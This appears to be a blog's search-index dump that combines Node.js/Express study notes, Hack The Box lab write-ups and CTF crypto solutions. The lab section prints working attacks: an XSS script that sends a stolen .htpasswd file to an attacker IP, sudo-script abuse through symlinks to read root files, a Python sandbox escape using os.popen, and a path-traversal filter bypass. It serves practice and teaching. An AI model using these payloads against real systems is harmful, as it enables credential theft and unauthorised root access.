","date":"2025-03-31","objectID":"/study_nodejs1/:1:0","tags":["开发","study"],"title":"Study Nodejs「1」","uri":"/study_nodejs1/"},{"categories":["nodejs"],"content":"npm的生命周期 第一开始也没想到这个还有生命周期的，就记录一下 \"predev\": \"node prev.js\", \"dev\": \"node index.js\", \"postdev\": \"node post.js\" 执行 npm run dev 命令的时候 predev 会自动执行 他的生命周期是在dev之前执行，然后执行dev命令，再然后执行postdev，也就是dev之后执行 运用场景例如npm run build 可以在打包之后删除dist目录等等 post例如你编写完一个工具发布npm，那就可以在之后写一个ci脚本顺便帮你推送到git等等 ","date":"2025-03-31","objectID":"/study_nodejs1/:2:0","tags":["开发","study"],"title":"Study Nodejs「1」","uri":"/study_nodejs1/"},{"categories":["nodejs"],"content":"npx 个人理解npx的作用是在命令行中运行node包中的可执行文件，而不需要全局安装这些包。哎，这样就不会全局包乱飞和包版本冲突了，就行python的虚拟环境隔离一样，但是又感觉和pipx有异曲同工之妙？ ","date":"2025-03-31","objectID":"/study_nodejs1/:3:0","tags":["开发","study"],"title":"Study Nodejs「1」","uri":"/study_nodejs1/"},{"categories":["nodejs"],"content":"express 目前体验是很爽的，把原生nodejs的http服务封装了，方便使用 (下面代码的风格都是module) ","date":"2025-03-31","objectID":"/study_nodejs1/:4:0","tags":["开发","study"],"title":"Study Nodejs「1」","uri":"/study_nodejs1/"},{"categories":["nodejs"],"content":"基本使用方法 http服务 比较好玩的地方在于express是一个函数，同时监听端口的时候也不用像原生的一样了 //原生 const http = require('http'); const url = require('url'); const fs = require('fs'); http.createServer((req, res) =\u003e { }).listen(3000,()=\u003e{ }); import express from 'express'; const app = express() app.listen(3000, () =\u003e console.log('Listening on port 3000')) 接口编写 编写get post 接口 app.get('/', (req, res) =\u003e { res.send('get') }) app.post('/create', (req, res) =\u003e { res.send('post') }) 接受前端的参数 他是无法直接接手json参数的，所以要用中间件 app.use(express.json()) app.get('/', (req, res) =\u003e { console.log(req.query) //get 用query res.send('get') }) app.post('/create', (req, res) =\u003e { console.log(req.body) //post用body res.send('post') }) //如果是动态参数用 params app.get('/:id', (req, res) =\u003e { console.log(req.params) res.send('get id') }) ","date":"2025-03-31","objectID":"/study_nodejs1/:4:1","tags":["开发","study"],"title":"Study Nodejs「1」","uri":"/study_nodejs1/"},{"categories":["nodejs"],"content":"模块化 全部东西写依托很难看和维护，express允许将路由处理程序拆分为多个模块，每个模块负责处理特定的路由。通过将路由处理程序拆分为模块，可以使代码逻辑更清晰，易于维护和扩展 例如文件结构 src --user.js --list.js app.js src/user.js import express from 'express'; const router = express.Router(); router.post('/login', (req, res) =\u003e { res.json({ code: 200, msg: '登录成功' }) }); router.post('/register', (req, res) =\u003e { res.json({ code: 200, msg: '注册成功' }) }); export default router; src/list.js import express from 'express'; const router = express.Router(); router.get('/getall', (req, res) =\u003e { res.json({ code: 200, msg: '获取成功', data: [{ id: 1 }] }) }); export default router; app.js import express from 'express'; import User from './src/user.js' const app = express() app.use(express.json()) app.use('/user', User) app.get('/', (req, res) =\u003e { console.log(req.query) res.send('get') }) app.get('/:id', (req, res) =\u003e { console.log(req.params) res.send('get id') }) app.post('/create', (req, res) =\u003e { console.log(req.body) res.send('post') }) app.listen(3000, () =\u003e console.log('Listening on port 3000')) ","date":"2025-03-31","objectID":"/study_nodejs1/:4:2","tags":["开发","study"],"title":"Study Nodejs「1」","uri":"/study_nodejs1/"},{"categories":["nodejs"],"content":"中间件 中间件是一个关键概念。中间件是处理HTTP请求和响应的函数，它位于请求和最终路由处理函数之间，可以对请求和响应进行修改、执行额外的逻辑或者执行其他任务。 中间件函数接收三个参数：req（请求对象）、res（响应对象）和next（下一个中间件函数）。通过调用next()方法，中间件可以将控制权传递给下一个中间件函数。如果中间件不调用next()方法，请求将被中止，不会继续传递给下一个中间件或路由处理函数 拿log4js举例子 middleware/logger.js import log4js from 'log4js'; // 配置 log4js log4js.configure({ appenders: { out: { type: 'stdout', // 输出到控制台 layout: { type: 'colored' // 使用带颜色的布局 } }, file: { type: 'file', // 输出到文件 filename: './logs/server.log', // 指定日志文件路径和名称 } }, categories: { default: { appenders: ['out', 'file'], // 使用 out 和 file 输出器 level: 'debug' // 设置日志级别为 debug } } }); // 获取 logger const logger = log4js.getLogger('default'); // 日志中间件 const loggerMiddleware = (req, res, next) =\u003e { logger.debug(`${req.method} ${req.url}`); // 记录请求方法和URL next(); }; export default loggerMiddleware; app.js import express from 'express'; import User from './src/user.js' import loggerMiddleware from './middleware/logger.js'; const app = express() app.use(loggerMiddleware) ","date":"2025-03-31","objectID":"/study_nodejs1/:4:3","tags":["开发","study"],"title":"Study Nodejs「1」","uri":"/study_nodejs1/"},{"categories":["nodejs"],"content":"防盗链 防盗链一般主要就是验证host 或者 referer，手动添加一个白名单 import express from 'express'; const app = express(); const whiteList = ['localhost'] const preventHotLingking = (req, res, next) =\u003e { const referer = req.get('referer') if (referer) { const { hostname } = new URL(referer) if (!whiteList.includes(hostname)) { res.status(403).send('403 Forbidden') return } } console.log(referer) next(); } app.use(express.static('static')) app.listen(3000, () =\u003e { console.log('Server is running on port 3000'); }); ","date":"2025-03-31","objectID":"/study_nodejs1/:4:4","tags":["开发","study"],"title":"Study Nodejs「1」","uri":"/study_nodejs1/"},{"categories":["nodejs"],"content":"跨域问题 跨域资源共享（Cross-Origin Resource Sharing，CORS）是一种机制，用于在浏览器中实现跨域请求访问资源的权限控制。当一个网页通过 XMLHttpRequest 或 Fetch API 发起跨域请求时，浏览器会根据同源策略（Same-Origin Policy）进行限制。同源策略要求请求的源（协议、域名和端口）必须与资源的源相同，否则请求会被浏览器拒绝，所以我们在做前后端分离的项目的时候百分百遇到 ","date":"2025-03-31","objectID":"/study_nodejs1/:5:0","tags":["开发","study"],"title":"Study Nodejs「1」","uri":"/study_nodejs1/"},{"categories":["nodejs"],"content":"一般解决方法 举个小例子 发送请求 fetch('http://localhost:3000/info').then(res=\u003e{ return res.json() }).then(res=\u003e{ console.log(res) }) 写个普通的get接口 import express from 'express' const app = express() app.get('/info', (req, res) =\u003e { res.json({ code: 200 }) }) app.listen(3000, () =\u003e { console.log('http://localhost:3000') }) 这个时候就会报错，因为跨域了，解决方法就是设置响应头(我这里是5500端口) app.use('*',(req,res,next)=\u003e{ res.setHeader('Access-Control-Allow-Origin','http://localhost:5500') next() }) ","date":"2025-03-31","objectID":"/study_nodejs1/:5:1","tags":["开发","study"],"title":"Study Nodejs「1」","uri":"/study_nodejs1/"},{"categories":["nodejs"],"content":"请求头 Accept：指定客户端能够处理的内容类型。 Accept-Language：指定客户端偏好的自然语言。 Content-Language：指定请求或响应实体的自然语言。 Content-Type：指定请求或响应实体的媒体类型。 DNT (Do Not Track)：指示客户端不希望被跟踪。 Origin：指示请求的源（协议、域名和端口）。 User-Agent：包含发起请求的用户代理的信息。 Referer：指示当前请求的源 URL。 Content-type: application/x-www-form-urlencoded | multipart/form-data | text/plain 那么我们需要支持的时候就写 ‘Access-Control-Allow-Headers’,‘Content-Type’ ","date":"2025-03-31","objectID":"/study_nodejs1/:5:2","tags":["开发","study"],"title":"Study Nodejs「1」","uri":"/study_nodejs1/"},{"categories":["nodejs"],"content":"请求方法支持 默认情况下，CORS 仅允许 GET、POST、HEAD和OPTIONS 方法。如果需要支持其他方法，需要设置 Access-Control-Allow-Methods 头。 比如需要支持patch ‘Access-Control-Allow-Methods’,‘POST,GET,OPTIONS,DELETE,PATCH’ ","date":"2025-03-31","objectID":"/study_nodejs1/:5:3","tags":["开发","study"],"title":"Study Nodejs「1」","uri":"/study_nodejs1/"},{"categories":["nodejs"],"content":"自定义响应头 自定义响应头是指在响应中添加自定义的 HTTP 头。自定义响应头可以用于传递额外的信息，例如自定义的错误码、自定义的响应消息等。 app.get('/info', (req, res) =\u003e { res.set('zsm', '1') res.json({ code: 200 }) }) 那么前端接收的方法也很简单 fetch('http://localhost:3000/info').then(res=\u003e{ const headers = res.headers console.log(headers.get('zsm')) return res.json() }).then(res=\u003e{ console.log(res) }) 我们只需要去接收读取就行了，但是发现是null 这是因为后端没有抛出该响应头所以后端需要增加抛出的一个字段 app.get('/info', (req, res) =\u003e { res.set('zsm', '1') res.setHeader('Access-Control-Expose-Headers', 'zsm') res.json({ code: 200 }) }) ","date":"2025-03-31","objectID":"/study_nodejs1/:5:4","tags":["开发","study"],"title":"Study Nodejs「1」","uri":"/study_nodejs1/"},{"categories":["靶场"],"content":"靶场链接 https://app.hackthebox.com/machines/Alert https://app.hackthebox.com/machines/LinkVortex code是本周靶机哎 ","date":"2025-03-24","objectID":"/htb-alert_and_linkvortex_and_code/:1:0","tags":["渗透"],"title":"HTB Alert\u0026LinkVortex\u0026code","uri":"/htb-alert_and_linkvortex_and_code/"},{"categories":["靶场"],"content":"笔记 HTB的靶场质量都很高，不想像其他的一样写很多没用的东西，主要写学到的东西和靶机概况 ","date":"2025-03-24","objectID":"/htb-alert_and_linkvortex_and_code/:2:0","tags":["渗透"],"title":"HTB Alert\u0026LinkVortex\u0026code","uri":"/htb-alert_and_linkvortex_and_code/"},{"categories":["靶场"],"content":"whatweb 可以自动分析网站的响应并识别出使用的Web框架、CMS、服务器、JavaScript库等技术组件， 一般情况下whatweb -v输出的比较详细，而且好看， WhatWeb 有 4 种扫描级别，通过数字 1~4 选择，默认为1： stealthy 每个目标发送一次http请求，并且会跟随重定向 unused 不可用（从2011年开始，此参数就是在开发状态） aggressive 每个目标发送少量的http请求，这些请求时根据参数为1时结果确定的 heavy 每个目标会发送大量的http请求，会去尝试每一个插件 whatweb -v -a 等级 域名。 ","date":"2025-03-24","objectID":"/htb-alert_and_linkvortex_and_code/:2:1","tags":["渗透"],"title":"HTB Alert\u0026LinkVortex\u0026code","uri":"/htb-alert_and_linkvortex_and_code/"},{"categories":["靶场"],"content":"git-dumper 类似githack，都可以用 ","date":"2025-03-24","objectID":"/htb-alert_and_linkvortex_and_code/:2:2","tags":["渗透"],"title":"HTB Alert\u0026LinkVortex\u0026code","uri":"/htb-alert_and_linkvortex_and_code/"},{"categories":["靶场"],"content":"LinkVortex提权 bob@linkvortex:~$ sudo -l Matching Defaults entries for bob on linkvortex: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT User bob may run the following commands on linkvortex: (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png 看看这个.sh文件是什么 bob@linkvortex:~$ cat /opt/ghost/clean_symlink.sh #!/bin/bash QUAR_DIR=\"/var/quarantined\" if [ -z $CHECK_CONTENT ];then CHECK_CONTENT=false fi LINK=$1 if ! [[ \"$LINK\" =~ \\.png$ ]]; then /usr/bin/echo \"! First argument must be a png file !\" exit 2 fi if /usr/bin/sudo /usr/bin/test -L $LINK;then LINK_NAME=$(/usr/bin/basename $LINK) LINK_TARGET=$(/usr/bin/readlink $LINK) if /usr/bin/echo \"$LINK_TARGET\" | /usr/bin/grep -Eq '(etc|root)';then /usr/bin/echo \"! Trying to read critical files, removing link [ $LINK ] !\" /usr/bin/unlink $LINK else /usr/bin/echo \"Link found [ $LINK ] , moving it to quarantine\" /usr/bin/mv $LINK $QUAR_DIR/ if $CHECK_CONTENT;then /usr/bin/echo \"Content:\" /usr/bin/cat $QUAR_DIR/$LINK_NAME 2\u003e/dev/null fi fi fi 脚本设计用于检查一个文件（作为参数传递）是否是一个指向 PNG 文件的符号链接。如果是，它会检查符号链接的目标，并决定是删除它还是将其隔离。具体来说，如果符号链接指向敏感文件或目录（如 /etc 或 /root ），则会删除链接。否则，它将在指定的目录（/var/quarantined）中隔离链接。如果将 CHECK_CONTENT 变量设置为 true ，它还可能打印隔离文件的內容。 首先我们的思路就是读取root的flag，我们可以把这个.txt链接到.png上，但是直接链接会报错，我们在中间再转折一下 bob@linkvortex:~$ export CHECK_CONTENT=true bob@linkvortex:~$ touch link1.png bob@linkvortex:~$ `ln -sf /root/root.txt link1.png` bob@linkvortex:~$ touch link2.png bob@linkvortex:~$ `ln -sf /home/bob/link1.png link2.png` bob@linkvortex:~$ ls link1.png link2.png user.txt bob@linkvortex:~$ sudo bash /opt/ghost/clean_symlink.sh link2.png Link found [ link2.png ] , moving it to quarantine Content: a2340eed30a7a15b1fb810a7945d2338 实际上这个就是个任意文件读取，我们当然可以去读取ssh的密钥去做到提权的效果 ","date":"2025-03-24","objectID":"/htb-alert_and_linkvortex_and_code/:2:3","tags":["渗透"],"title":"HTB Alert\u0026LinkVortex\u0026code","uri":"/htb-alert_and_linkvortex_and_code/"},{"categories":["靶场"],"content":"XSS外带文件 写这个就想起了ccb线下赛的XSS外带cookie，虽然不是web手，但是想起来这个没做出来就很难受，害 看看网页源代码 \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003clink rel=\"stylesheet\" href=\"css/style.css\"\u003e \u003ctitle\u003eAlert - Markdown Viewer\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cnav\u003e \u003ca href=\"index.php?page=alert\"\u003eMarkdown Viewer\u003c/a\u003e \u003ca href=\"index.php?page=contact\"\u003eContact Us\u003c/a\u003e \u003ca href=\"index.php?page=about\"\u003eAbout Us\u003c/a\u003e \u003ca href=\"index.php?page=donate\"\u003eDonate\u003c/a\u003e \u003c/nav\u003e \u003cdiv class=\"container\"\u003e \u003ch1\u003eMarkdown Viewer\u003c/h1\u003e\u003cdiv class=\"form-container\"\u003e \u003cform action=\"visualizer.php\" method=\"post\" enctype=\"multipart/form-data\"\u003e \u003cinput type=\"file\" name=\"file\" accept=\".md\" required\u003e \u003cinput type=\"submit\" value=\"View Markdown\"\u003e \u003c/form\u003e \u003c/div\u003e \u003c/div\u003e \u003cfooter\u003e \u003cp style=\"color: black;\"\u003e© 2024 Alert. All rights reserved.\u003c/p\u003e \u003c/footer\u003e \u003c/body\u003e \u003c/html\u003e 发现md文件写的东西都会在这里显现，典型的XSS漏洞. 突然想起来服务是Apache，那么就有.htpasswd用来存放密码，那么我们的思路就是去外带这个文件，去得到账号的密码，伟大的grok3会给我payload的 本地先开python的http服务(ccb的那个五分钟刷新一次不应该关的啊啊啊) \u003cscript\u003e fetch(\"http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd\") .then(response =\u003e response.text()) .then(data =\u003e { fetch(\"http://10.10.16.5:80/?file_content=\" + encodeURIComponent(data)); }); \u003c/script\u003e 连接输入到Contact Us，本地接收到%3Cpre%3Ealbert%3A%24apr1%24bMoRBJOg%24igG8WBtQ1xYDTQdLjSWZQ%2F%0A%3C%2Fpre%3E%0A ，后面爆破就行了 ","date":"2025-03-24","objectID":"/htb-alert_and_linkvortex_and_code/:2:4","tags":["渗透"],"title":"HTB Alert\u0026LinkVortex\u0026code","uri":"/htb-alert_and_linkvortex_and_code/"},{"categories":["靶场"],"content":"端口转发 假设ssh进入一个靶机，ps发现还有端口在运行，但是nmap并没有发现，就可以尝试把端口转发出去，例如 ssh -L 8080:127.0.0.1:8080 albert@alert.htb，一般漏洞点在这个web里面 ","date":"2025-03-24","objectID":"/htb-alert_and_linkvortex_and_code/:2:5","tags":["渗透"],"title":"HTB Alert\u0026LinkVortex\u0026code","uri":"/htb-alert_and_linkvortex_and_code/"},{"categories":["靶场"],"content":"code的模拟输出 modules = globals().values() global _module for name, module in sys.modules.items(): if name == ('o'+'s'): _module = module break _method = getattr(_module, 'po' + 'pen') file_obj = _method(' ') _method = getattr(file_obj, 're' + 'ad') output = _method() print(output) 其实本质是 import os output = os.popen(' ').read() print(output) 在题目禁用的乱七八糟的情况下也是一个好方法，可以直接去读flag，爽啦 ","date":"2025-03-24","objectID":"/htb-alert_and_linkvortex_and_code/:2:6","tags":["渗透"],"title":"HTB Alert\u0026LinkVortex\u0026code","uri":"/htb-alert_and_linkvortex_and_code/"},{"categories":["靶场"],"content":"code的root.txt martin@code:~$ sudo -l Matching Defaults entries for martin on localhost: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User martin may run the following commands on localhost: (ALL : ALL) NOPASSWD: /usr/bin/backy.sh martin@code:~$ ls -la /usr/bin/backy.sh -rwxr-xr-x 1 root root 926 Sep 16 2024 /usr/bin/backy.sh martin@code:~$ cat /usr/bin/backy.sh #!/bin/bash if [[ $# -ne 1 ]]; then /usr/bin/echo \"Usage: $0 \u003ctask.json\u003e\" exit 1 fi json_file=\"$1\" if [[ ! -f \"$json_file\" ]]; then /usr/bin/echo \"Error: File '$json_file' not found.\" exit 1 fi allowed_paths=(\"/var/\" \"/home/\") updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub(\"\\\\.\\\\./\"; \"\"))' \"$json_file\") /usr/bin/echo \"$updated_json\" \u003e \"$json_file\" directories_to_archive=$(/usr/bin/echo \"$updated_json\" | /usr/bin/jq -r '.directories_to_archive[]') is_allowed_path() { local path=\"$1\" for allowed_path in \"${allowed_paths[@]}\"; do if [[ \"$path\" == $allowed_path* ]]; then return 0 fi done return 1 } for dir in $directories_to_archive; do if ! is_allowed_path \"$dir\"; then /usr/bin/echo \"Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed.\" exit 1 fi done /usr/bin/backy \"$json_file\" 哎，这个其实是一个开源的东西，github可以找到，类似备份，可以看到禁用了目录穿越，但是只是替换成空格，那么双写绕过就行了，除了这个方法，还可以写.json老老实实的写 { \"destination\": \"/home/martin/backups\", \"verbose_log\": true, \"directories_to_sync\": [ \"/var/../root/\" ], \"directories_to_archive\": [ \"/var/..././root/\" ] } 去读root的全部路径到backup，然后发现生成的.tar.gz2包root才可以读，哎，怎么办呢？ base64是个伟大的东西，可以把整个文件转成base64，然后去本地解密成.tar.gz2，也就是base64 -d encoded.txt \u003e 1.tar.gz2，然后解压得到flag ","date":"2025-03-24","objectID":"/htb-alert_and_linkvortex_and_code/:2:7","tags":["渗透"],"title":"HTB Alert\u0026LinkVortex\u0026code","uri":"/htb-alert_and_linkvortex_and_code/"},{"categories":["CTF"],"content":"前言 去南京的路上，顺手写写 ","date":"2025-03-22","objectID":"/2025polarctf/:1:0","tags":["crypto"],"title":"2025PolarCTF春季赛","uri":"/2025polarctf/"},{"categories":["CTF"],"content":"题目 ","date":"2025-03-22","objectID":"/2025polarctf/:2:0","tags":["crypto"],"title":"2025PolarCTF春季赛","uri":"/2025polarctf/"},{"categories":["CTF"],"content":"crypto RSA1-2 task import os from Crypto.Util.number import * from typing import Union from flag import flag bits = 512 def polar(msg: Union[bytes, bytearray], length: int) -\u003e bytes: assert length \u003e len(msg), \"指定的长度必须大于原始消息长度加 1。\" return bytes(msg) + b'\\x00' + os.urandom(length - len(msg) - 1) def unpolar(msg: Union[bytes, bytearray]) -\u003e bytes: msg = bytes(msg) assert b'\\x00' in msg, \"输入的字节串中不包含分隔符。\" return msg.split(b'\\x00')[0] def getflag1(m): result = [] for i in range(2): result.append(getPrime(bits)) p, q = result if p \u003c= q: p, q = q, p e = 0x10001 n = p * q c = pow(m, e, n) hint = pow(2024 * p + 2025, q, n) print('---------- getflag 1 ----------') print(f'{c = }') print(f'{n = }') print(f'{hint = }') def getflag2(m): result = [] for i in range(2): result.append(getPrime(bits)) p, q = result n = p * q hint1 = pow(m, p, n) hint2 = pow(m, q, n) print('---------- getflag 2 ----------') print(f'{hint1 = }') print(f'{hint2 = }') print(f'{n = }') def getflag3(m): result = [] for i in range(2): result.append(getPrime(bits)) p, q = result e = 0x10001 n = p * q g = 20242025 hint = pow(g + p * 1111, e, n) c = pow(m, e, n) print('---------- getflag 3 ----------') print(f'{c = }') print(f'{n = }') print(f'{hint = }') assert len(flag) == 42 mm = [] for i in range(0, 42, 14): mm.append(bytes_to_long(polar(flag[i:i + 14], bits // 4 - 1))) m1, m2, m3 = mm getflag1(m1) getflag2(m2) getflag3(m3) 三个很经典的数论题堆到了一起，额，后面补长度，其实没啥区别，直接写就行了，如果想看细节推导的话，可以等我下周写（ exp from Crypto.Util.number import * import gmpy2 c = n = hint = e=65537 p = gmpy2.gcd(pow(2025,n,n)-hint,n) q = n // p d = gmpy2.invert(e,(p-1)*(q-1)) m = pow(c,d,n) print(long_to_bytes(m)) from Crypto.Util.number import * n = x = y = a=pow(x,n,n) p=GCD(a-y,n) q=n//p d = inverse(p,(p-1)*(q-1)) m = pow(x,d,n) print(long_to_bytes(m)) from Crypto.Util.number import * import gmpy2 c = n = hint = e = 65537 b = 20242025 p = gmpy2.gcd(pow(b,e,n)-hint,n) q = n // p d = gmpy2.invert(e,(p-1)*(q-1)) m = pow(c,d,n) print(long_to_bytes(m)) beginner task assert(len(open('flag.txt', 'rb').read()) \u003c= 50) assert(str(int.from_bytes(open('flag.txt', 'rb').read(), byteorder='big') \u003c\u003c 10000).endswith('16732186163543403522711798960598469149029861032300263763941636254755451456334507142958574415880945599253440468447483752611840')) #endwith后为125位 #其中加密方式为utf-8 分解模数之后分开处理，计算 1840 能被 2 整除的最高次幂，然后搞定就行了 K = 16732186163543403522711798960598469149029861032300263763941636254755451456334507142958574415880945599253440468447483752611840 m = 5**125 r = pow(2, 10000, m) r_inv = pow(r, -1, m) F = (K % m * r_inv) % m uflag = F.to_bytes((F.bit_length() + 7) // 8, byteorder='big').decode('utf-8') print(uflag) Ununicast task import libnum import gmpy2 import random from flag import * m = libnum.s2n(flag) n_list = [] c_list = [] q_list = [] p_list = [] for i in range(1, 6): p = libnum.generate_prime(1024) q = libnum.generate_prime(1024) n = p * q * (i + 1) p_list.append(p) q_list.append(q) n_list.append(n) while True: e = random.randint(10, 30) if gmpy2.is_prime(e): break for index in range(len(n_list)): c = pow(m, e, n_list[index]) c_list.append(c_list.append(c * (index + 1))) print(\"n\" + str(index + 1) + \" =\", n_list[index]) print(\"c\" + str(index + 1) + \" =\", c_list[index]) 经典的crt问题，稍微复杂一点，看看互素的是哪几个，然后算模逆，e的筛选不用管，遍历就行了 exp import gmpy2 k1 = c1 k2 = c2 // 2 k4 = c4 // 4 # 计算 N 和 CRT 参数 N = n1 * n2 * n4 y1 = n2 * n4 y2 = n1 * n4 y4 = n1 * n2 # 计算模逆 z1 = gmpy2.invert(y1, n1) z2 = gmpy2.invert(y2, n2) z4 = gmpy2.invert(y4, n4) # 计算 a = m^e mod N a = (k1 * y1 * z1 % N + k2 * y2 * z2 % N + k4 * y4 * z4 % N) % N # 可能的 e 值 possible_e = [11, 13, 17, 19, 23, 29] # 尝试每个 e，计算 m for e in possible_e: root, exact = gmpy2.iroot(a, e) if exact: m = int(root) # 将 m 转换为字节 flag_bytes = m.to_bytes((m.bit_length() + 7) // 8, 'big') try: # 尝试解码为字符串 flag = flag_bytes.decode('ascii') print(f\"e = {e}, flag = {flag}\") # 检查是否符合 flag 格式 if flag.startswith('flag{'): print(f\"找到 flag: {flag}\") break except UnicodeDecodeError: print(f\"e = {e}, flag_bytes = {flag_b","date":"2025-03-22","objectID":"/2025polarctf/:2:1","tags":["crypto"],"title":"2025PolarCTF春季赛","uri":"/2025polarctf/"},{"categories":["CTF"],"content":"web 来个弹窗 就是个xss，直接一把梭哈 椰子树晕淡水鱼 真正的信息收集，你可以看见藏头诗“文件上传”，然后关于里面是用户名，密码本可以靠dirb扫出来，然后bp开爆，然后是个文件上传，传个png马，然后蚂剑上不去，手打得到flag，在根目录 coke的登陆 f12看cookie是密码，账户是coke 其他的忘了过程了 ","date":"2025-03-22","objectID":"/2025polarctf/:2:2","tags":["crypto"],"title":"2025PolarCTF春季赛","uri":"/2025polarctf/"},{"categories":["CTF"],"content":"总结 2025PolarCTF春季赛质量还好吧，在车上不能认真的去写，有很多琐事缠身，最后rank是12有点可惜吧，毕竟后面几个小时一直没写，wp也懒得写了 ","date":"2025-03-22","objectID":"/2025polarctf/:3:0","tags":["crypto"],"title":"2025PolarCTF春季赛","uri":"/2025polarctf/"},{"categories":["CTF"],"content":"前言 质量挺高的一场新生赛，老登大乱斗（），这里只写一部分wp ","date":"2025-03-09","objectID":"/hgctf2025/:1:0","tags":["crypto"],"title":"Hgctf2025","uri":"/hgctf2025/"},{"categories":["CTF"],"content":"crypto题目 ","date":"2025-03-09","objectID":"/hgctf2025/:2:0","tags":["crypto"],"title":"Hgctf2025","uri":"/hgctf2025/"},{"categories":["CTF"],"content":"baby_factor task from Crypto.Util.number import * def create(): pl = [] for i in range(3): pl.append(getPrime(1024)) return sorted(pl) pl = create() m=b'NSSCTF{xxx}' p,q,r = pl[0],pl[1],pl[2] e = 65537 n = p*q*r phi = (p-1)*(q-1)*(r-1) c=pow(bytes_to_long(m),e,n) print(f'n={n}') print(f'phi={phi}') print(f'c={c}') 好像是出题人数据问题 exp n= phi= c= e=65537 from Crypto.Util.number import * m=pow(c,inverse(e,phi),n) flag=long_to_bytes(m) print(flag) ","date":"2025-03-09","objectID":"/hgctf2025/:2:1","tags":["crypto"],"title":"Hgctf2025","uri":"/hgctf2025/"},{"categories":["CTF"],"content":"baby_factor_revenge task from Crypto.Util.number import * def create(): pl = [] for i in range(3): pl.append(getPrime(1024)) return sorted(pl) pl = create() m=b'NSSCTF{xxxxxx}' p,q,r = pl[0],pl[1],pl[2] n = p*q*r phi = (p-1)*(q-1)*(r-1) e=65537 phi_2=(p-1)*(q-1) n2=p*q c=pow(bytes_to_long(m),e,n2) print(f'n={n}') print(f'phi={phi}') print(f'c={c}') 经典的已知phi\u0026n分解 exp from math import gcd from math import isqrt from random import randrange from gmpy2 import is_prime def factorize(N, phi): \"\"\" Recovers the prime factors from a modulus if Euler's totient is known. This method only works for a modulus consisting of 2 primes! :param N: the modulus :param phi: Euler's totient, the order of the multiplicative group modulo N :return: a tuple containing the prime factors, or None if the factors were not found \"\"\" s = N + 1 - phi d = s ** 2 - 4 * N p = int(s - isqrt(d)) // 2 q = int(s + isqrt(d)) // 2 return p, q def factorize_multi_prime(N, phi): \"\"\" Recovers the prime factors from a modulus if Euler's totient is known. This method works for a modulus consisting of any number of primes, but is considerably be slower than factorize. More information: Hinek M. J., Low M. K., Teske E., \"On Some Attacks on Multi-prime RSA\" (Section 3) :param N: the modulus :param phi: Euler's totient, the order of the multiplicative group modulo N :return: a tuple containing the prime factors \"\"\" prime_factors = set() factors = [N] while len(factors) \u003e 0: # Element to factorize. N = factors[0] w = randrange(2, N - 1) i = 1 while phi % (2 ** i) == 0: sqrt_1 = pow(w, phi // (2 ** i), N) if sqrt_1 \u003e 1 and sqrt_1 != N - 1: # We can remove the element to factorize now, because we have a factorization. factors = factors[1:] p = gcd(N, sqrt_1 + 1) q = N // p if is_prime(p): prime_factors.add(p) elif p \u003e 1: factors.append(p) if is_prime(q): prime_factors.add(q) elif q \u003e 1: factors.append(q) # Continue in the outer loop break i += 1 return tuple(prime_factors) n= phi= c= prime_list = sorted(factorize_multi_prime(n,phi)) p,q,r = prime_list[0],prime_list[1],prime_list[2] print(p,q,r) p= q= r= from Crypto.Util.number import * e=65537 phi1=(p-1) n1=p d=inverse(e,phi1) ck=pow(c,d,n1) print(long_to_bytes(ck)) ","date":"2025-03-09","objectID":"/hgctf2025/:2:2","tags":["crypto"],"title":"Hgctf2025","uri":"/hgctf2025/"},{"categories":["CTF"],"content":"baby_lattice task from Crypto.Util.number import * from Crypto.Cipher import AES import os from Crypto.Util.Padding import pad from secret import flag miku = 30 p = getPrime(512) key = getPrime(512) while key\u003e p: key= getPrime(512) ts = [] gs = [] zs = [] for i in range(miku): t = getPrime(512) z = getPrime(400) g= (t * key + z) % p ts.append(t) gs.append(g) zs.append(z) print(f'p = {p}') print(f'ts = {ts}') print(f'gs = {gs}') iv= os.urandom(16) cipher = AES.new(str(key).encode()[:16], AES.MODE_CBC,iv) ciphertext=cipher.encrypt(pad(flag.encode(),16)) print(f'iv={iv}') print(f'ciphertext={ciphertext}') 就是最简单的NHP问题 exp p = ts = gs = iv=b'\\x88\\x0c\\x7f\\x92\\xd7\\xb7\\xaf4\\xe4\\xfb\\xd1_\\xab\\xff)\\xb8' ciphertext=b'\\x94\\x198\\xd6\\xa2mK\\x00\\x06\\x7f\\xad\\xa0M\\xf7\\xadV;EO$\\xee\\xcdB0)\\xfb!\u00268%,M' p = p rs = ts cs = gs t = len(rs) kbits = 400 K = 2 ** kbits P = identity_matrix(t) * p RC = matrix([[-1, 0], [0, 1]]) * matrix([rs, cs]) KP = matrix([[K / p, 0], [0, K]]) M = block_matrix([[P, 0], [RC, KP]], subdivide=False) shortest_vector = M.LLL() x = shortest_vector[1, -2] / K * p % p print(x) from Crypto.Cipher import AES from Crypto.Util.Padding import unpad key = aes_key = str(key).encode()[:16] iv=b'\\x88\\x0c\\x7f\\x92\\xd7\\xb7\\xaf4\\xe4\\xfb\\xd1_\\xab\\xff)\\xb8' ciphertext=b'\\x94\\x198\\xd6\\xa2mK\\x00\\x06\\x7f\\xad\\xa0M\\xf7\\xadV;EO$\\xee\\xcdB0)\\xfb!\u00268%,M' cipher = AES.new(aes_key, AES.MODE_CBC, iv) flag = unpad(cipher.decrypt(ciphertext), 16) print(flag) ","date":"2025-03-09","objectID":"/hgctf2025/:2:3","tags":["crypto"],"title":"Hgctf2025","uri":"/hgctf2025/"},{"categories":["CTF"],"content":"babysignin task from Crypto.Util.number import getPrime, bytes_to_long p=getPrime(128) q=getPrime(128) n=p*q phi=(p-1)*(q-1) flag=\"NSSCTF{xxxxxx}\" print(\"p=\",p) print(\"q=\",q) m=bytes_to_long(flag.encode()) e=4 c=pow(m,e,n) print(\"c=\",c) print(\"n=\",n) 